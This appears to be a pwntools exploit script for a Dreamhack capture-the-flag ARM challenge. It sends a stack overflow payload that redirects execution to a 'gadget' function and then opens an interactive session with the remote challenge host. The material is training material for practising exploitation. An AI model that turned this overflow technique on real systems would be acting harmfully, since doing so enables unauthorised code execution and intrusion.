#!/usr/bin/env python3
from pwn import *

# ================= 기본 설정 =================
context.arch = "arm"
context.binary = elf = ELF('./arm1')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# ================= 원격 정보 =================
HOST, PORT = "host3.dreamhack.games 8296".split()

# ================= I/O =================
s   = lambda data               : p.send(data)
sa  = lambda delim, data        : p.sendafter(delim, data)
sl  = lambda data               : p.sendline(data)
sla = lambda delim, data        : p.sendlineafter(delim, data)

r   = lambda num=4096           : p.recv(num)
rl  = lambda                    : p.recvline()
ru  = lambda delim, drop=True   : p.recvuntil(delim, drop)

# ================= Leak Helpers =================
l64  = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

# ================= 연결 =================
if args.REMOTE:
    p = remote(HOST, int(PORT))
    libc = ELF('./libc.so.6')
else:
    p = process()#env={"LD_PRELOAD": "./libc.so.6"})
    # gdb.attach(p)

# ================= 실행 =================
def slog(n, a): return success(': '.join([n, hex(a)]))

gadget = elf.sym["gadget"]

pay = b'A'*0x10 + p32(gadget)

sl(pay)


p.interactive()
